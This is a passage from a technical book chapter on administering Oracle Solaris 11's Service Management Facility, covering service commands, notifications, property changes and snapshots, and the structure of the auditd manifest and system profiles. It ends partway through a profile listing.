# Chapter 5. Playing with Oracle Solaris 11 Services

In this chapter, we will cover:

*   Reviewing SMF operations
*   Handling manifests and profiles
*   Creating SMF services
*   Administering inetd-controlled network services
*   Troubleshooting Oracle Solaris 11 services

# Introduction

Oracle Solaris 11 presents the **Service Management Facility** (**SMF**) as a main feature. This framework is responsible for administrating and monitoring all services and applications. SMF was introduced in Oracle Solaris 10, and it offers several possibilities that make our job easier by being responsible for several tasks, such as the following:

*   Starting, stopping, and restarting services
*   Monitoring services
*   Discovering all service dependencies
*   Troubleshooting services
*   Providing an individual log for each available service

Usually, there are many services in each system, and they are organized by category, such as system, network, device, and application. Usually, a service only has an instance named default. However, a service can present more than one instance (for example, there can be more than one Oracle instance and more than one configured network interface, and this difference is highlighted in the reference to the service. This reference is called **Fault Management Resource Identifier** (**FMRI**), which looks like `svc:/system/cron:default`, where:

*   `svc`: This is a native service from SMF
*   `system`: This is the service category
*   `cron`: This is the service name
*   `default`: This is the instance

The main daemon that's responsible for the administration of all the SMF services is `svc.startd` and it is called during system initialization when reading the configuration file, `/etc/inittab`, as follows:

```
root@solaris11-1:~# more /etc/inittab
 (truncated output)
ap::sysinit:/usr/sbin/autopush -f /etc/iu.ap
smf::sysinit:/lib/svc/bin/svc.startd  >/dev/msglog 2<>/dev/msglog </dev/console
p3:s1234:powerfail:/usr/sbin/shutdown -y -i5 -g0 >/dev/msglog 2<>/dev/msglog
root@solaris11-1:~#
```

Another goal of `svc.startd` is to ensure that the system reaches the appropriate milestone, that is, a status or level where a group of services are online, which are very similar to old run-level states. The important milestones are single-user (run-level S), multi-user (run-level 2), and multi-user server (run-level 3):

```
root@solaris11-1:~# svcs -a | grep milestone
online         21:54:11 svc:/milestone/unconfig:default
online         21:54:11 svc:/milestone/config:default
online         21:54:12 svc:/milestone/devices:default
online         21:54:23 svc:/milestone/network:default
online         21:54:25 svc:/milestone/name-services:default
online         21:54:25 svc:/milestone/single-user:default
online          0:54:52 svc:/milestone/self-assembly-complete:default
online          0:54:59 svc:/milestone/multi-user:default
online          0:55:00 svc:/milestone/multi-user-server:default
```

There're two special milestones, as follows:

*   **all**: This is the default milestone where all services are initialized
*   **none**: No service is initialized—which can be used during an Oracle Solaris 11 maintenance

Based on the previous information, it's important to know the correct initialization order, as shown:

*   **Boot loader**: The root filesystem archive is loaded from disk to memory
*   **Booter**: The boot archive (it's a RAM disk image very similar to `initramfs` from Linux and contains all the files required to boot the system) is loaded in the memory and is executed. The boot loader is a service:

    ```
    root@solaris11-1:~# svcs -a | grep boot-archive
    online         21:53:51 svc:/system/boot-archive:default
    online          0:54:51 svc:/system/boot-archive-update:default
    ```

Any `boot-archive` maintenance operation must be done by the `bootadm` command.

*   **Ram disk**: The kernel is extracted from the boot archive and is executed.
*   **Kernel**: A small root filesystem is mounted and, from there, important drivers are loaded. Afterwards, the true root filesystem is mounted, the remaining drivers are loaded, and the `/sbin/init` script is executed.
*   **Init**: The `/sbin/init` script reads the `/etc/inittab` file, and the `svc.started` daemon is executed.
*   **svc.started**: This starts SMF services and their related processes. All service configurations are read (through the `svc.configd` daemon) from the main service database named `repository.db`, which is located in `/etc/svc` together with its respective backups.

# Reviewing SMF operations

Administering services in Oracle Solaris 11 is very simple because there are few commands with an intuitive syntax. Therefore, the main purpose of this section is to review the operational part of the SMF administration.

## Getting ready

This recipe requires a virtual machine (VirtualBox or VMware) with Oracle Solaris 11 installed and 4 GB RAM.

## How to do it…

When an administrator is responsible for managing services in Oracle Solaris 11, the most important and common task is to list the existing services. This operation can be done by executing the following command:

```
root@solaris11-1:~# svcs -a | more
STATE          STIME    FMRI
legacy_run      0:54:59 lrc:/etc/rc2_d/S47pppd
legacy_run      0:54:59 lrc:/etc/rc2_d/S89PRESERVE
disabled       21:53:34 svc:/system/device/mpxio-upgrade:default
disabled       21:53:35 svc:/network/install:default
disabled       21:53:36 svc:/network/ipsec/ike:default
(truncated output)
online         21:53:34 svc:/system/early-manifest-import:default
online         21:53:34 svc:/system/svc/restarter:default
online         21:53:41 svc:/network/socket-config:default
(truncated output)

```

The `svcs` command has the goal of listing the existing services, and when the `-a` option is specified, we are interested in listing all the services.

From the preceding output, the following useful information is obtained:

*   The `legacy_run` state is a label for legacy services, which wasn't converted to the SMF framework. Other possible statuses are as follows:

    *   `online`: This means that the service is running
    *   `disabled`: This means that the service is not running
    *   `offline`: This means that the service is enabled, but it's either not running or not available to run
    *   `initialized`: This means that the service is starting up
    *   `degraded`: This means that the service is running, but with limited features working
    *   `maintenance`: This means that the service isn't running because of a configuration problem

*   The `STIME` field shows the time when the service was started
*   `FMRI` is the alias object that references the service

SMF in Oracle Solaris 11 does an excellent job when we have to find the service dependencies of a service (the `-d` option) and discover which services are dependent on this service (the `-D` option). Some examples are as follows:

```
root@solaris11-1:~# svcs -a | grep auditd
online          0:54:55 svc:/system/auditd:default
root@solaris11-1:~# svcs -d svc:/system/auditd:default
STATE          STIME    FMRI
online         21:54:25 svc:/milestone/name-services:default
online         21:54:40 svc:/system/filesystem/local:default
online          0:54:53 svc:/system/system-log:default
root@solaris11-1:~# svcs -D svc:/system/auditd:default
STATE          STIME    FMRI
disabled       21:53:48 svc:/system/console-login:terma
disabled       21:53:49 svc:/system/console-login:termb
online          0:54:55 svc:/system/console-login:default
online          0:54:56 svc:/system/console-login:vt2
online          0:54:56 svc:/system/console-login:vt6
online          0:54:56 svc:/system/console-login:vt3
online          0:54:56 svc:/system/console-login:vt5
online          0:54:56 svc:/system/console-login:vt4
online          0:54:59 svc:/milestone/multi-user:default
```

Another good method to find the dependencies of a service is to use the `svc` command, as follows:

```
root@solaris11-1:~# svcs -l svc:/system/auditd:default
fmri         svc:/system/auditd:default
name         Solaris audit daemon
enabled      true
state        online
next_state   none
state_time   March  5, 2014 00:43:41 AM BRT
logfile      /var/svc/log/system-auditd:default.log
restarter    svc:/system/svc/restarter:default
contract_id  115 
manifest     /lib/svc/manifest/system/auditd.xml
dependency   require_all/none svc:/system/filesystem/local (online)
dependency   require_all/none svc:/milestone/name-services (online)
dependency   optional_all/none svc:/system/system-log (online)
```

From the previous output, some good information is obtained, such as knowing that the service is enabled (`online`); it has three service dependencies (as shown in the `svcs –d` command); and finding their respective logfiles (`/var/svc/log/system-auditd:default.log`), which could be examined using `more /var/svc/log/system-auditd:default.log`.

There's good information to learn about the `contract_id` attribute (`115`) by running the following command:

```
root@solaris11-1:~# ctstat -i 115 -v
CTID    ZONEID  TYPE    STATE   HOLDER  EVENTS  QTIME   NTIME   
115     0       process owned   11      0       -       -       
  cookie:                0x20
  informative event set: none
  critical event set:    hwerr empty
  fatal event set:       none
  parameter set:         inherit regent
  member processes:      944
  inherited contracts:   none
  service fmri:          svc:/system/auditd:default
  service fmri ctid:     115
  creator:               svc.startd
  aux:                   start
root@solaris11-1:~#
```

The associated process ID from `auditd` is `944`, and this service was initialized by the `svc.startd` daemon. Additionally, the same information about the process ID can be found by running the following command using a short form of FMRI:

```
root@solaris11-1:~# svcs -p auditd
STATE          STIME    FMRI
online          0:54:55 svc:/system/auditd:default
                0:54:55      944 auditd

```

A short form of FMRI is a unique sequence that makes it possible to distinguish this service from others, and this short form always refers to the default instance of the specified service.

A good `svcs` command parameter to troubleshoot a service is as follows:

```
root@solaris11-1:~# svcs -x auditd
svc:/system/auditd:default (Solaris audit daemon)
 State: online since March  2, 2014 12:54:55 AM BRT
   See: auditd(1M)
   See: audit(1M)
   See: auditconfig(1M)
   See: audit_flags(5)
   See: audit_binfile(5)
   See: audit_syslog(5)
   See: audit_remote(5)
   See: /var/svc/log/system-auditd:default.log
Impact: None.
```

If there's any service that was already configured, it should be running. However, if it isn't or it's preventing other services from running, we can find out the reason by executing the following command:

```
root@solaris11-1:~# svcs -xv

```

The previous command output doesn't show anything, but there could have been some broken services. At end of the chapter, we'll come back to this issue.

So far, all the tasks were focused on collecting information about a service. Our next step is to learn how to administer them using the `svcadm` command. The available options for this command are as follows:

*   `svcadm enable <fmri>`: This will enable a service
*   `svcadm enable –r <fmri>`: This will enable a service recursively and its dependencies
*   `svcadm disable <fmri>`: This will disable a service
*   `svcadm disable –t <fmri>`: This will disable a service temporarily (the service will be enabled in the next boot)
*   `svcadm restart <fmri>`: This will restart a service
*   `svcadm refresh <fmri>`: This will read the configuration file of a service again
*   `svcadm clear <fmri>`: This will bring a service from the maintenance state to the online state
*   `svcadm mark maintenance <fmri>`: This will put a service in the maintenance state

A few examples are shown as follows:

```
root@solaris11-1:/# svcadm disable auditd
root@solaris11-1:/# svcs -a | grep auditd
disabled       20:33:12 svc:/system/auditd:default
root@solaris11-1:/# svcadm enable auditd
root@solaris11-1:/# svcs -a | grep auditd
online         20:33:35 svc:/system/auditd:default
```

SMF also supports a notification feature using SMTP service and SNMP trap. To enable and configure this feature (using SMTP), it is necessary to install the notification package, and this task can be executed by running the following command:

```
root@solaris11-1:/# pkg install smtp-notify

```

With the `smtp-notify` package installed, we can enable and configure any service to mail messages to `root@localhost` if its status changes from online to maintenance, as shown below:

```
root@solaris11-1:/# svcadm enable smtp-notify
root@solaris11-1:/# svcs -a | grep smtp-notify
online         20:29:07 svc:/system/fm/smtp-notify:default
root@solaris11-1:~# svccfg -s svc:/system/fm/smtp-notify:default setnotify -g from-online,to-maintenance mailto:root@localhost

```

To check whether the notification service is appropriately configured for all services, execute the following command:

```
root@solaris11-1:~# svcs –n
Notification parameters for FMA Events
    Event: problem-diagnosed
        Notification Type: smtp
            Active: true
            reply-to: root@localhost
            to: root@localhost

        Notification Type: snmp
            Active: true

        Notification Type: syslog
            Active: true

    Event: problem-repaired
        Notification Type: snmp
            Active: true

    Event: problem-resolved
        Notification Type: snmp
            Active: true
System wide notification parameters:
svc:/system/svc/global:default:
    Event: to-maintenance
        Notification Type: smtp
            Active: true
            to: root@localhost

    Event: from-online
        Notification Type: smtp
            Active: true
            to: root@localhost
```

Finally, if we verify the root mailbox, we'll see the result from our configuration:

```
root@solaris11-1:/# mail
From noaccess@solaris11-1.example.com Sun Mar  2 20:29:05 2014
Date: Sun, 2 Mar 2014 05:17:28 -0300 (BRT)
From: No Access User <noaccess@solaris11-1.example.com>
Message-Id: <201403020817.s228HSRC006537@solaris11-1.example.com>
Subject: Fault Management Event: solaris11-1:SMF-8000-YX
To: root@solaris11-1.example.com
Content-Length: 791

SUNW-MSG-ID: SMF-8000-YX, TYPE: defect, VER: 1, SEVERITY: major
EVENT-TIME: Sun Mar  2 05:17:23 BRT 2014
PLATFORM: VirtualBox, CSN: 0, HOSTNAME: solaris11-1
SOURCE: software-diagnosis, REV: 0.1
EVENT-ID: acfbe77f-47fc-6e3b-835a-9005dc8ec70c
DESC: A service failed - a method is failing in a retryable manner but too often.
AUTO-RESPONSE: The service has been placed into the maintenance state.
IMPACT: svc:/system/zones:default is unavailable.
REC-ACTION: Run 'svcs -xv svc:/system/zones:default' to determine the generic reason why the service failed, the location of any logfiles, and a list of other services impacted. Please refer to the associated reference document at http://support.oracle.com/msg/SMF-8000-YX for the latest service procedures and policies regarding this diagnosis.
```

A service in Oracle Solaris 11 has several properties and all of them can be viewed by using the `svcprop` command, as follows:

```
root@solaris11-1:/# svcprop auditd
preselection/flags astring lo
preselection/naflags astring lo
preselection/read_authorization astring solaris.smf.value.audit
preselection/value_authorization astring solaris.smf.value.audit
queuectrl/qbufsz count 0
queuectrl/qdelay count 0
queuectrl/qhiwater count 0
queuectrl/qlowater count 0
(truncated output)

```

If we want to check a specific property from the audit service, we have to execute the following command:

```
root@solaris11-1:/# svcprop -p audit_remote_server/login_grace_time auditd
30
```

If we go further, it's possible to interact (read and write) with the properties from the service through the `svccfg` command:

```
root@solaris11-1:/# svccfg 
svc:>
```

The first step is to list all available services by running the following sequence of commands:

```
svc:> list
application/cups/scheduler
application/cups/in-lpd
smf/manifest
application/security/tcsd
application/management/net-snmp
(truncated output)

svc:> select auditd
svc:/system/auditd> list
:properties
default
```

While selecting the `auditd` service, there're two possibilities—to list the general properties of a service or to list the private properties of its `default` instance. Thus, to list its general properties, execute the following command:

```
svc:/system/auditd> listprop
usr                          dependency         
usr/entities                 fmri        svc:/system/filesystem/local
usr/grouping                 astring     require_all
usr/restart_on               astring     none
(truncated output)

```

Listing properties from the default instance is done by running the following commands:

```
svc:/system/auditd:default> select auditd:default
svc:/system/auditd:default> listprop
preselection                        application
preselection/flags                  astring     lo
preselection/naflags                astring     lo
preselection/read_authorization     astring   solaris.smf.value.audit
preselection/value_authorization    astring   solaris.smf.value.audit
queuectrl                           application
(truncated output)

```

It's feasible to list and change any service's property by running the following commands:

```
svc:/system/auditd:default> listprop audit_remote/p_timeout
audit_remote/p_timeout count       5
svc:/system/auditd:default> setprop audit_remote/p_timeout=10
svc:/system/auditd:default> listprop audit_remote/p_timeout
audit_remote/p_timeout count       10
```

Many times, during a reconfiguration, the properties of a service can get changed to another non-default value and eventually this service could present problems and go to the maintenance state because of this new configuration. Then, how do we restore the old values of the properties?

To fix the problem, we could return all values from the properties of this service to their default values. This task can be executed by using the automatic snapshot (a kind of backup) by SMF. Therefore, execute the following commands:

```
svc:/system/auditd:default> revert start
svc:/system/auditd:default> listprop audit_remote/p_timeout
audit_remote/p_timeout count       5
svc:/system/auditd:default> unselect
svc:/system/auditd> unselect
svc:> exit
root@solaris11-1:~#
```

The available snapshots are as follows:

*   `running`: This snapshot is taken every time the `svcadm` refresh is run
*   `start`: This snapshot is taken at the last successful start
*   `initial`: This snapshot is taken during the first import of the manifest

An SMF manifest is an XML file that describes a service, a set of instances, and their respective properties. When a manifest is imported, all its configurations (including their properties) are loaded in the service configuration repository. The default location of a manifest is the `manifest` directory under `/lib/svc/`.

Another interesting and related task is to learn how to change the environment variables of a service. The following example shows us the value from the `TZ` property that will be changed to Brazil/East:

```
root@solaris11-1:~# pargs -e `pgrep -f /usr/sbin/auditd`
937:  /usr/sbin/auditd
envp[0]: _=*11*/usr/sbin/auditd
envp[1]: LANG=en_US.UTF-8
envp[2]: LC_ALL=
envp[3]: LC_COLLATE=
envp[4]: LC_CTYPE=
envp[5]: LC_MESSAGES=
envp[6]: LC_MONETARY=
envp[7]: LC_NUMERIC=
envp[8]: LC_TIME=
envp[9]: PATH=/usr/sbin:/usr/bin
envp[10]: PWD=/root
envp[11]: SHLVL=2
envp[12]: SMF_FMRI=svc:/system/auditd:default
envp[13]: SMF_METHOD=start
envp[14]: SMF_RESTARTER=svc:/system/svc/restarter:default
envp[15]: SMF_ZONENAME=global
envp[16]: TZ=localtime
envp[17]: A__z="*SHLVL
```

Thus, in order to change and check the value of the `TZ` property from the `auditd` service, execute the following commands:

```
root@solaris11-1:~# svccfg -s svc:/system/auditd:default setenv TZ Brazil/East
root@solaris11-1:~# svcadm refresh svc:/system/auditd:default
root@solaris11-1:~# svcadm restart svc:/system/auditd:default
root@solaris11-1:~# pargs -e `pgrep -f /usr/sbin/auditd`
7435:  /usr/sbin/auditd
envp[0]: _=*11*/usr/sbin/auditd
envp[1]: LANG=en_US.UTF-8
envp[2]: LC_ALL=
envp[3]: LC_COLLATE=
envp[4]: LC_CTYPE=
envp[5]: LC_MESSAGES=
envp[6]: LC_MONETARY=
envp[7]: LC_NUMERIC=
envp[8]: LC_TIME=
envp[9]: PATH=/usr/sbin:/usr/bin
envp[10]: PWD=/root
envp[11]: SHLVL=2
envp[12]: SMF_FMRI=svc:/system/auditd:default
envp[13]: SMF_METHOD=start
envp[14]: SMF_RESTARTER=svc:/system/svc/restarter:default
envp[15]: SMF_ZONENAME=global
envp[16]: TZ=Brazil/East
envp[17]: A__z="*SHLVL
```

There is one last good trick to find out the properties that were changed in the SMF configuration repository:

```
root@solaris11-1:~# svccfg -s auditd listcust -L
start/environment              astring     admin       TZ=Brazil/East
```

### An overview of the recipe

In this section, you learned the fundamentals of SMF as well as how to administer SMF services using `svcs` and `svcadm`. We have also configured the notification service to log (using the SMTP service) any interesting event such as changing the status of services. In the end, the `svcprop` and `svccfg` commands were used to get and see the service's properties as well as the snapshot feature (the `listsnap` and `revert` subcommands) from `svccfg` that was used to rollback all the properties to their default values.

# Handling manifests and profiles

When handling SMF services, almost every service configuration is focused on two key concepts: profiles and manifests. The following recipe teaches you about the details.

## Getting ready

This recipe requires a virtual machine (VirtualBox or VMware) running Oracle Solaris 11 and with a 4 GB RAM.

## How to do it…

As we have explained previously, an SMF manifest is an XML file that describes a service, a set of instances, and their properties. When a manifest is imported, its entire configuration (including its properties) is loaded in the service configuration repository. This import operation can be enforced, potentially loading new configurations in the repository, by executing the following command:

```
root@solaris11-1:~# svcadm restart svc:/system/manifest-import:default

```

The default location of the manifest is the `manifest` directory under `/lib/svc/`, as follows:

```
root@solaris11-1:~# cd /lib/svc/manifest/
root@solaris11-1:/lib/svc/manifest# ls –l
total 27
drwxr-xr-x  10 root     sys           17 Dec 23 18:41 application
drwxr-xr-x   2 root     sys            2 Sep 19  2012 device
drwxr-xr-x   2 root     sys           10 Dec 23 18:54 milestone
drwxr-xr-x  16 root     sys           53 Jan 17 07:23 network
drwxr-xr-x   2 root     sys            2 Sep 19  2012 platform
drwxr-xr-x   2 root     sys            2 Sep 19  2012 site
drwxr-xr-x   8 root     sys           73 Dec 23 18:55 system
root@solaris11-1:/lib/svc/manifest# cd application/
root@solaris11-1:/lib/svc/manifest/application# ls –l
total 92
-r--r--r--   1 root     sys         3464 Sep 19  2012 coherence.xml
-r--r--r--   1 root     sys         6160 Sep 19  2012 cups.xml
drwxr-xr-x   2 root     sys           11 Dec 23 18:41 desktop-cache
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 font
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 graphical-login
-r--r--r--   1 root     sys         1762 Sep 19  2012 man-index.xml
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 management
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 opengl
drwxr-xr-x   2 root     sys            7 Dec 23 18:41 pkg
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 security
-r--r--r--   1 root     sys         2687 Sep 19  2012 stosreg.xml
-r--r--r--   1 root     sys         1579 Sep 19  2012 texinfo-update.xml
-r--r--r--   1 root     sys         9013 Sep 19  2012 time-slider-plugin.xml
-r--r--r--   1 root     sys         4469 Sep 19  2012 time-slider.xml
drwxr-xr-x   2 root     sys            5 Dec 23 18:41 x11
```

According to the output, service manifests are categorized as:

*   `application`
*   `device`
*   `milestone`
*   `network`
*   `platform`
*   `site`
*   `system`.

The previous output has listed all the application manifests as an example and, as we will learn, manifests play a very important role in the configuration of a service. For example, it would be nice to study the `audit.xml` manifest to learn the details. Therefore, this study will be done as follows:

```
root@solaris11-1:/lib/svc/manifest# cd system/
root@solaris11-1:/lib/svc/manifest/system# cat auditd.xml
<?xml version="1.0"?>
<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
<!--
 Copyright (c) 2005, 2012, Oracle and/or its affiliates. All rights reserved.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
-->

<service_bundle type='manifest' name='SUNWcsr:auditd'>

<service
  name='system/auditd'
  type='service'
  version='1'>

  <single_instance />

  <dependency
    name='usr'
    type='service'
    grouping='require_all'
    restart_on='none'>
    <service_fmri value='svc:/system/filesystem/local' />
  </dependency>

  <dependency
    name='ns'
    type='service'
    grouping='require_all'
    restart_on='none'>
    <service_fmri value='svc:/milestone/name-services' />
  </dependency>

  <dependency
    name='syslog'
    type='service'
    grouping='optional_all'
    restart_on='none'>
    <service_fmri value='svc:/system/system-log' />
  </dependency>

  <dependent
    name='multi-user'
    grouping='optional_all'
    restart_on='none'>
    <service_fmri value='svc:/milestone/multi-user'/>
  </dependent>

  <dependent
    name='console-login'
    grouping='optional_all'
    restart_on='none'>
    <service_fmri value='svc:/system/console-login'/>
  </dependent>

  <exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/svc-auditd'
    timeout_seconds='60'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <exec_method
    type='method'
    name='refresh'
    exec='/lib/svc/method/svc-auditd'
    timeout_seconds='30'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <!--
    auditd waits for c2audit to quiet down after catching a -TERM
    before exiting; auditd's timeout is 20 seconds
  -->

  <exec_method
    type='method'
    name='stop'
    exec=':kill -TERM'
    timeout_seconds='30'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <!-- SIGs HUP, TERM, and USR1 are all expected by auditd -->
  <property_group name='startd' type='framework'>
    <propval name='ignore_error' type='astring'
      value='core,signal' />
  </property_group>

  <property_group name='general' type='framework'>
    <!-- to start/stop auditd -->
    <propval name='action_authorization' type='astring'
      value='solaris.smf.manage.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.manage.audit' />
  </property_group>

  <instance name='default' enabled='true'>

  <!--
    System-wide audit preselection flags - see auditconfig(1M)
    and audit_flags(5).

    The 'flags' property is the system-wide default set of
    audit classes that is combined with the per-user audit
    flags to configure the process audit at login and role
    assumption time.

    The 'naflags' property is the set of audit classes for
    audit event selection when an event cannot be attributed
    to an authenticated user.
  -->
  <property_group name='preselection' type='application'>
    <propval name='flags' type='astring'
      value='lo' />
    <propval name='naflags' type='astring'
      value='lo' />
    <propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <!--
    Audit Queue Control Properties - see auditconfig(1M)

      Note, that the default value for all the queue control
      configuration parameters is 0, which makes auditd(1M) to
      use current active system parameters.
  -->
  <property_group name='queuectrl' type='application' >
    <propval name='qbufsz' type='count'
      value='0' />
    <propval name='qdelay' type='count'
      value='0' />
    <propval name='qhiwater' type='count'
      value='0' />
    <propval name='qlowater' type='count'
      value='0' />
    <propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <!--
    Audit Policies - see auditconfig(1M)

      Note, that "all" and "none" policies available as a
      auditconfig(1M) policy flags actually means a full/empty set
      of other policy flags. Thus they are not configurable in the
      auditd service manifest, but set all the policies to true
      (all) or false (none).
  -->
  <property_group name='policy' type='application' >
    <propval name='ahlt' type='boolean'
      value='false' />
    <propval name='arge' type='boolean'
      value='false' />
    <propval name='argv' type='boolean'
      value='false' />
    <propval name='cnt' type='boolean'
      value='true' />
    <propval name='group' type='boolean'
      value='false' />
    <propval name='path' type='boolean'
      value='false' />
    <propval name='perzone' type='boolean'
      value='false' />
    <propval name='public' type='boolean'
      value='false' />
    <propval name='seq' type='boolean'
      value='false' />
    <propval name='trail' type='boolean'
      value='false' />
    <propval name='windata_down' type='boolean'
      value='false' />
    <propval name='windata_up' type='boolean'
      value='false' />
    <propval name='zonename' type='boolean'
      value='false' />
    <propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <!--
    Audit Remote Server to allow reception of data sent by the
    audit_remote(5) - see audit auditconfig(1M).

    'active' is boolean which defines whether the server functionality
      is activated or not.

    'listen_address' address the server listens on.
      Empty 'listen_address' property defaults to listen on all
      local addresses.

    'listen_port' the local listening port; 0 defaults to 16162 - port
      associated with the "solaris-audit" Internet service name - see
      services(4).

    'login_grace_time' the server disconnects after login grace time
      (in seconds) if the connection has not been successfully
      established; 0 defaults to no limit, default value is 30 (seconds).

    'max_startups' number of concurrent unauthenticated connections
      to the server at which the server starts refusing new
      connections; default value is 10\. Note that the value might
      be specified in "begin:rate:full" format to allow random
      early drop mode.
  -->
        <property_group name='audit_remote_server' type='application' >
                <propval name='active' type='boolean'
                        value='true' />
                <propval name='listen_address' type='astring'
                        value='' />
                <propval name='listen_port' type='count'
                        value='0' />
                <propval name='login_grace_time' type='count'
                        value='30' />
                <propval name='max_startups' type='astring'
                        value='10' />
                <property name='read_authorization' type='astring'>
                        <astring_list>
                                <value_node value='solaris.smf.manage.audit' />
                                <value_node value='solaris.smf.value.audit' />
                        </astring_list>
                </property>
                <propval name='value_authorization' type='astring'
                        value='solaris.smf.value.audit' />
        </property_group>

  <!--
    Plugins to configure where to send the audit trail - see
    auditconfig(1M), audit_binfile(5), audit_remote(5),
    audit_syslog(5) 

    Each plugin type property group has properties:

    'active' is a boolean which defines whether or not
      to load the plugin.

    'path' is a string which defines name of the
      plugin's shared object in the file system.
      Relative paths assume a prefix of
      "/usr/lib/security/$ISA"

    'qsize' is an integer which defines a plugin specific
      maximum number of records that auditd will queue
      for it. A zero (0) value indicates not defined.
      This overrides the system's active queue control
      hiwater mark.

      and various attributes as defined on the plugin's man page
  -->
  <property_group name='audit_binfile' type='plugin' >
    <propval name='active' type='boolean'
      value='true' />
    <propval name='path' type='astring'
      value='audit_binfile.so' />
    <propval name='qsize' type='count'
      value='0' />
    <propval name='p_dir' type='astring'
      value='/var/audit' />
    <propval name='p_fsize' type='astring'
      value='0' />
    <propval name='p_minfree' type='count'
      value='1' />
    <property name='read_authorization' type='astring'>
      <astring_list>
        <value_node value='solaris.smf.manage.audit' />
        <value_node value='solaris.smf.value.audit' />
      </astring_list>
    </property>
    <propval name='value_authorization' type='astring'
        value='solaris.smf.value.audit' />
  </property_group>

  <property_group name='audit_syslog' type='plugin' >
    <propval name='active' type='boolean'
      value='false' />
    <propval name='path' type='astring'
      value='audit_syslog.so' />
    <propval name='qsize' type='count'
      value='0' />
    <propval name='p_flags' type='astring'
      value='' />
    <property name='read_authorization' type='astring'>
      <astring_list>
        <value_node value='solaris.smf.manage.audit' />
        <value_node value='solaris.smf.value.audit' />
     </astring_list>
    </property>
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <property_group name='audit_remote' type='plugin' >
    <propval name='active' type='boolean'
      value='false' />
    <propval name='path' type='astring'
      value='audit_remote.so' />
    <propval name='qsize' type='count'
      value='0' />
    <propval name='p_hosts' type='astring'
      value='' />
    <propval name='p_retries' type='count'
      value='3' />
    <propval name='p_timeout' type='count'
      value='5' />
    <property name='read_authorization' type='astring'>
      <astring_list>
        <value_node value='solaris.smf.manage.audit' />
        <value_node value='solaris.smf.value.audit' />
      </astring_list>
    </property>
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  </instance>

  <stability value='Evolving' />

  <template>
    <common_name>
      <loctext xml:lang='C'>
        Solaris audit daemon
      </loctext>
    </common_name>
    <documentation>
      <manpage title='auditd'
        section='1M'
        manpath='/usr/share/man'/>
      <manpage title='audit'
        section='1M'
        manpath='/usr/share/man'/>
      <manpage title='auditconfig'
        section='1M'
        manpath='/usr/share/man'/>
      <manpage title='audit_flags'
        section='5'
        manpath='/usr/share/man'/>
      <manpage title='audit_binfile'
        section='5'
        manpath='/usr/share/man'/>
      <manpage title='audit_syslog'
        section='5'
        manpath='/usr/share/man'/>
      <manpage title='audit_remote'
        section='5'
        manpath='/usr/share/man'/>
           </documentation>
  </template>

</service>

</service_bundle>
```

This manifest (`auditd.xml`) has several common elements that appear in other manifests. The key elements are shown as follows:

*   `service_bundle`: This is the package name of the `auditd` daemon
*   `service`: This is the name of the service (`system/auditd`)
*   `dependency`: This determines which services `auditd` depends on
*   `dependent`: This determines which services depend on `auditd`
*   `exec_method`: This is how SMF starts, stops, restarts, and refreshes the `auditd` daemon
*   `property_group`: These are the properties from the `auditd` service and their instances
*   `template`: This determines what information is available about the `auditd` service and where it is
*   `manpage`: This determines which man pages are related to the `auditd` service

A profile is an XML configuration file that is applied during the first system boot after an Oracle Solaris 11 installation, where it is possible to customize which services and instances will be initialized. The following is a directory listing:

```
root@solaris11-1:~# cd /etc/svc/profile/
root@solaris11-1:/etc/svc/profile# ls -al
total 81
drwxr-xr-x   3 root     sys           17 Dec 23 18:56 .
drwxr-xr-x   3 root     sys           15 Mar  4 02:49 ..
-r--r--r--   1 root     sys        12262 Sep 19  2012 generic_limited_net.xml
-r--r--r--   1 root     sys         6436 Sep 19  2012 generic_open.xml
lrwxrwxrwx   1 root     staff         23 Dec 23 18:56 generic.xml -> generic_limited_net.xml
-r--r--r--   1 root     sys         2581 Sep 19  2012 inetd_generic.xml
lrwxrwxrwx   1 root     staff         17 Dec 23 18:56 inetd_services.xml -> inetd_generic.xml
-r--r--r--   1 root     sys          713 Sep 19  2012 inetd_upgrade.xml
lrwxrwxrwx   1 root     staff         10 Dec 23 18:56 name_service.xml -> ns_dns.xml
-r--r--r--   1 root     sys          571 Sep 19  2012 ns_dns.xml
-r--r--r--   1 root     sys          478 Sep 19  2012 ns_files.xml
-r--r--r--   1 root     sys          713 Sep 19  2012 ns_ldap.xml
-r--r--r--   1 root     sys          832 Sep 19  2012 ns_nis.xml
-r--r--r--   1 root     sys         1673 Sep 19  2012 ns_none.xml
-r--r--r--   1 root     sys          534 Sep 19  2012 platform_none.xml
lrwxrwxrwx   1 root     root          17 Dec 23 18:41 platform.xml -> platform_none.xml
drwxr-xr-x   2 root     sys            3 Dec 23 18:56 site
```

Although there are several manifests, two of them are the most important: `generic.xml`, which enables all standard services, and `generic_limited_net.xml`, which disables most of the Internet services except the `ssh` service and a few other services that are remote services. The latter manifest is as follows:

```
root@solaris11-1:/etc/svc/profile# more generic_limited_net.xml
<?xml version='1.0'?>
(truncated output)
  <!--
      svc.startd(1M) services
  -->
  <service name='system/coreadm' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>
  <service name='system/cron' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>
  <service name='system/cryptosvc' version='1' type='service'>
    <instance name='default' enabled='true'/>
  </service>

(truncated output)

<service name='network/ssh' version='1' type='service'>
